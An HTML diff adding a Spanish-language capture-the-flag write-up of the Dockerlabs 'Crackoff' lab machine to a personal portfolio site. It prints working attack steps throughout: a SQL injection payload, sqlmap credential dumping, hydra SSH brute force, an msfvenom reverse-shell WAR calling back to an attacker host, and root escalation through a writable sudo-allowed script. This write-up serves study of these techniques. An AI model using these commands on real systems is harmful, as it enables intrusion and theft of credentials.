@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crackoff</title>
+    <link href="../style/estilo.css" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+    <link rel="stylesheet"
+        href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <script>hljs.highlightAll();</script>
+</head>
+
+<body class="bg-gray-900 text-white">
+
+    <nav class="bg-gray-800 text-white sticky top-0 z-50 shadow-md">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+        <div class="flex justify-between items-center h-16">
+            <div class="flex-shrink-0">
+            <h1>Santiago Lorenzo</h1>
+            </div>
+            <div class="hidden md:flex space-x-4">
+            <a href="../index.html#inicio" class="hover:text-blue-400 transition">Inicio</a>
+            <a href="../index.html#certificados" class="hover:text-blue-400 transition">Certificaciones</a>
+            <a href="../index.html#proyectos" class="hover:text-blue-400 transition">Proyectos</a>
+            <a href="../writeup.html" class="hover:text-blue-400 transition">Write-ups</a>
+            </div>
+        </div>
+        </div>
+    </nav>
+
+    <main class="max-w-4xl mx-auto px-6 py-12">
+
+    <h1 class="text-4xl font-bold mb-2">🔹Máquina: CRACKOFF</h1>
+    <p class="text-gray-400 text-sm mb-8">📅 Publicado el <!-- TODO: fecha --> | Categoría: WEB / SQLi / PRIVESC | Dificultad: Difícil</p>
+
+    <section class="mb-8">
+        <h2 class="text-2xl font-semibold mb-2">📝 Descripción</h2>
+        <p class="text-gray-300 leading-relaxed">
+            Máquina de dificultad difícil (Dockerlabs, autor d1se0) que combina una inyección SQL en un
+            formulario de login, cracking de credenciales por fuerza bruta contra SSH, pivoting mediante
+            túnel SSH hacia un servicio Tomcat expuesto solo en loopback, ejecución remota de código vía
+            despliegue de un WAR malicioso en el manager de Tomcat, y una escalada de privilegios final
+            a través de un binario mal configurado en <code>sudoers</code>.
+        </p>
+    </section>
+
+    <!----------------- Análisis ----------------------->
+    <section class="mb-8">
+        <h2 class="text-2xl font-semibold mb-2">🔍 Análisis inicial</h2>
+        <p class="text-gray-300 mb-4">
+            Escaneo de puertos completo:
+        </p>
+        <pre><code class="language-bash">
+nmap -p- -Pn -sVC --min-rate 5000 172.17.0.2 -T2
+        </code></pre>
+        <img src="../Assets/crackoff/1-nmap.png" class="mt-4 mb-4 rounded-lg shadow-lg" alt="resultado nmap">
+
+        <p class="text-gray-300 mt-4">
+            Solo dos puertos abiertos:
+        </p>
+        <pre><code class="language-text">
+22/tcp   OpenSSH 9.6p1 Ubuntu 3ubuntu13.4
+80/tcp   Apache httpd 2.4.58 (Ubuntu)
+        </code></pre>
+
+        <p class="text-gray-300 mt-4">
+            Descubrimiento de directorios sobre el puerto 80:
+        </p>
+        <pre><code class="language-bash">
+gobuster dir -u http://172.17.0.2/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html
+        </code></pre>
+        <p class="text-gray-300 mt-4">
+            Aparece <code>/login.php</code>, un formulario de autenticación clásico.
+        </p>
+    </section>
+
+    <!-- Explotación -->
+    <section class="mb-8">
+        <h2 class="text-2xl font-semibold mb-2">💣 Explotación</h2>
+
+        <h3 class="text-xl font-semibold mb-2 mt-6">1) SQL Injection en login.php</h3>
+        <p class="text-gray-300 mb-4">
+            Probando una inyección típica en el campo usuario, el servidor devuelve la consulta SQL
+            construida por concatenación directa, confirmando la vulnerabilidad:
+        </p>
+        <pre><code class="language-text">
+admin' OR '1'='1
+
+Consulta SQL: SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'x'
+        </code></pre>
+        <p class="text-gray-300 mt-4">
+            Se capturó la petición con Burp Suite y se automatizó la extracción con <code>sqlmap</code>:
+        </p>
+        <img src="../Assets/crackoff/2-request.png" class="mt-4 mb-4 rounded-lg shadow-lg" alt="confirmación SQLi">
+        <pre><code class="language-bash">
+sqlmap -r request.txt --batch --dbs
+        </code></pre>
+        <pre><code class="language-text">
+available databases [4]:
+[*] crackoff_db
+[*] crackofftrue_db
+[*] information_schema
+[*] performance_schema
+        </code></pre>
+        <p class="text-gray-300 mt-4">
+            Enumeración de tabla y columnas, y volcado de la tabla <code>users</code>:
+        </p>
+        <pre><code class="language-bash">
+sqlmap -r request.txt --batch -D crackofftrue_db -T users -C id,username,password --dump
+        </code></pre>
+        <p class="text-gray-300 mt-4">
+            El dump devolvió 12 pares usuario/contraseña. Se armaron dos diccionarios
+            (<code>usuarios.txt</code> / <code>contraseñas.txt</code>) a partir de esas columnas para el
+            siguiente paso.
+        </p>
+
+        <h3 class="text-xl font-semibold mb-2 mt-6">2) Fuerza bruta contra SSH</h3>
+        <p class="text-gray-300 mb-4">
+            Las credenciales de la tabla de la aplicación web no necesariamente coinciden con las del
+            sistema operativo, así que en vez de asumir un par fijo se corrió fuerza bruta cruzada
+            (todos los usuarios contra todas las contraseñas) con hydra:
+        </p>
+        <pre><code class="language-bash">
+hydra -L usuarios.txt -P contraseñas.txt ssh://172.17.0.2 -t 4
+        </code></pre>
+        <img src="../Assets/crackoff/3.png" class="mt-4 mb-4 rounded-lg shadow-lg" alt="hydra SSH resultado">
+        <p class="text-gray-300 mt-4">
+            Resultado: <code>rosa</code> con la contraseña que en la tabla figuraba para otro usuario
+            (<code>jazmin</code> en el dump), confirmando el reuso de credenciales entre cuentas.
+        </p>
+        <pre><code class="language-bash">
+ssh rosa@172.17.0.2
+        </code></pre>
+
+        <h3 class="text-xl font-semibold mb-2 mt-6">3) Enumeración interna y pivoting a Tomcat</h3>
+        <p class="text-gray-300 mb-4">
+            Ya dentro como <code>rosa</code>, se revisaron los puertos internos:
+        </p>
+        <pre><code class="language-bash">
+        netstat -punta
+        </code></pre>
+        <img src="../Assets/crackoff/4 netstat.png" class="mt-4 mb-4 rounded-lg shadow-lg" alt="Tomcat vía túnel">
+        <p class="text-gray-300 mt-4">
+            El patrón 8005+8080 en loopback es firma clásica de una instalación estándar de Apache
+            Tomcat, solo accesible desde dentro de la propia máquina. Se reconectó por SSH con
+            forwarding de puerto para exponerlo en el atacante:
+        </p>
+        <pre><code class="language-bash">
+ssh rosa@172.17.0.2 -L 8080:127.0.0.1:8080
+        </code></pre>
+        <img src="../Assets/crackoff/5.png" class="mt-4 mb-4 rounded-lg shadow-lg" alt="Tomcat vía túnel">
+
+        <h3 class="text-xl font-semibold mb-2 mt-6">4) Acceso al manager de Tomcat</h3>
+        <p class="text-gray-300 mb-4">
+            El acceso directo con las credenciales reutilizadas fue rechazado (401). Se automatizó la
+            prueba con el módulo de Metasploit para el manager de Tomcat, usando los mismos diccionarios
+            del paso 1:
+        </p>
+        <pre><code class="language-bash">
+msfconsole -q
+use auxiliary/scanner/http/tomcat_mgr_login
+set RHOSTS 127.0.0.1
+set RPORT 8080
+set USER_FILE /home/kali/usuarios.txt
+set PASS_FILE /home/kali/contraseñas.txt
+run
+        </code></pre>
+        <img src="../Assets/crackoff/6.png" class="mt-4 mb-4 rounded-lg shadow-lg" alt="credenciales manager Tomcat">
+        <p class="text-gray-300 mt-4">
+            Credenciales válidas encontradas: <code>tomitoma:supersecurepasswordultra</code>, con acceso
+            confirmado a <code>/manager/html</code>.
+        </p>
+
+        <h3 class="text-xl font-semibold mb-2 mt-6">5) RCE vía WAR malicioso</h3>
+        <p class="text-gray-300 mb-4">
+            Con acceso al manager se generó un payload Java empaquetado como aplicación web:
+        </p>
+        <pre><code class="language-bash">
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;IP_ATACANTE&gt; LPORT=4444 -f war -o shell.war
+        </code></pre>
+        <p class="text-gray-300 mt-4">
+            Se desplegó el <code>shell.war</code> desde el panel del manager, se abrió listener y se
+            disparó el acceso a la aplicación desplegada:
+        </p>
+        <pre><code class="language-bash">
+nc -nlvp 4444
+curl http://127.0.0.1:8080/shell/
+        </code></pre>
+        <img src="../Assets/crackoff/7.png" class="mt-4 mb-4 rounded-lg shadow-lg" alt="shell reversa como tomcat">
+        <pre><code class="language-text">
+connect to [192.168.1.212] from (UNKNOWN) [172.17.0.2] 58442
+id
+uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
+        </code></pre>
+
+        <p class="text-gray-300 mt-4">
+            Tratamiento de la TTY para tener una shell interactiva completa:
+        </p>
+        <pre><code class="language-bash">
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+# Ctrl+Z
+stty raw -echo; fg
+export TERM=xterm-256color
+export SHELL=bash
+        </code></pre>
+
+        <h3 class="text-xl font-semibold mb-2 mt-6">6) Escalada de privilegios: catalina.sh en sudoers</h3>
+        <p class="text-gray-300 mb-4">
+            Revisando permisos de sudo para el usuario <code>tomcat</code>:
+        </p>
+        <pre><code class="language-bash">
+sudo -l
+        </code></pre>
+        <pre><code class="language-text">
+User tomcat may run the following commands on this host:
+    (ALL) NOPASSWD: /opt/tomcat/bin/catalina.sh
+        </code></pre>
+        <p class="text-gray-300 mt-4">
+            El binario es ejecutable como root sin contraseña, pero su dueño es el propio usuario
+            <code>tomcat</code>:
+        </p>
+        <pre><code class="language-bash">
+ls -la /opt/tomcat/bin/catalina.sh
+-rwxr-xr-x 1 tomcat tomcat 25323 /opt/tomcat/bin/catalina.sh
+        </code></pre>
+        <p class="text-gray-300 mt-4">
+            <code>sudo</code> valida la ruta del binario, no su contenido. Al ser escribible por
+            <code>tomcat</code>, se puede reemplazar su lógica y ejecutarla con privilegios de root:
+        </p>
+        <pre><code class="language-bash">
+nano /opt/tomcat/bin/catalina.sh
+# se agrega en una de las primeras líneas:
+/bin/bash
+
+sudo /opt/tomcat/bin/catalina.sh
+        </code></pre>
+        <img src="../Assets/crackoff/9-root.png" class="mt-4 mb-4 rounded-lg shadow-lg" alt="acceso root confirmado">
+        <pre><code class="language-bash">
+whoami
+root
+        </code></pre>
+    </section>
+
+    <!-- Resultado final -->
+    <section class="mb-8">
+        <h2 class="text-2xl font-semibold mb-2">🏆 Resultado</h2>
+        <p class="text-gray-300">
+            Acceso root confirmado, combinando cinco fallas encadenadas: SQL injection por concatenación
+            directa en el login, reuso de contraseñas entre la base de datos de la app y las cuentas SSH
+            del sistema, un servicio Tomcat expuesto solo en loopback pero alcanzable por pivoting SSH,
+            credenciales débiles en el manager de Tomcat que permiten RCE vía despliegue de WAR, y una
+            regla de <code>sudoers</code> mal configurada sobre un script escribible por el mismo usuario
+            al que se le otorgó el privilegio.
+        </p>
+        <p class="text-gray-300 mt-4">
+            Nota: la máquina tiene además una segunda ruta de privesc documentada por otros autores,
+            que en vez de explotar <code>catalina.sh</code> pivota desde <code>tomcat</code> hacia los
+            usuarios <code>mario</code> y <code>alice</code> (credenciales filtradas en el webroot y una
+            base KeePass), terminando en un script <code>/opt/alice/boss</code> con permisos 777 corriendo
+            en loop como root. Ambos caminos parten del mismo punto de entrada, lo que sugiere varias
+            configuraciones débiles apiladas a propósito en vez de una única cadena intencionada.
+        </p>
+    </section>
+
+    <div class="mt-10">
+        <a href="../writeup.html"
+            class="inline-block bg-blue-500 px-6 py-2 rounded-lg text-white hover:bg-blue-700 transition">
+            ← Volver a la lista de Write-ups
+        </a>
+    </div>
+
+    </main>
+
+</body>
+</html>
